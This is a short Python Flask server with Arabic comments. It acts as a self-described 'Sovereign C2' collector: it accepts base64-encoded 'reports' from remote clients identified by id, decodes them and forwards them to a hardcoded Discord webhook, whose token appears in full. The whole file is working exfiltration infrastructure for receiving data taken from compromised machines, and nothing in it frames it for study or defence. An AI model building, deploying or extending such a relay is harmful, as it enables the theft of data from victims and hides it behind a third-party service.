from flask import Flask, request, jsonify
import requests
import base64
from datetime import datetime

app = Flask(__name__)

# ضع رابط الويب هوك الخاص بك هنا
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1477005798855933965/UGo7IuLJ2B-cp00CizKypWijgIOs5_95klXi75FyNw9C0xKSDchP-8Om5kDSRHIoaVbe"

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

@app.route('/api/data', methods=['POST'])
def receive_data():
    try:
        data = request.get_json()
        if not data: return jsonify({"error": "No data"}), 400

        client_id = data.get('id', 'Unknown')
        # فك تشفير البيانات القادمة من العميل
        encoded_content = data.get('content', '')
        try:
            content = base64.b64decode(encoded_content).decode('utf-8')
        except:
            content = encoded_content

        log(f"📥 استقبال بيانات من: {client_id}")

        # إرسال إلى Discord
        payload = {
            "username": "Sovereign C2",
            "content": f"**📡 تقرير جديد من: {client_id}**\n```\n{content}\n```"
        }
        requests.post(DISCORD_WEBHOOK, json=payload)
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        log(f"❌ خطأ: {e}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    # يعمل على جميع واجهات الشبكة على منفذ 5000
    app.run(host='0.0.0.0', port=5000)
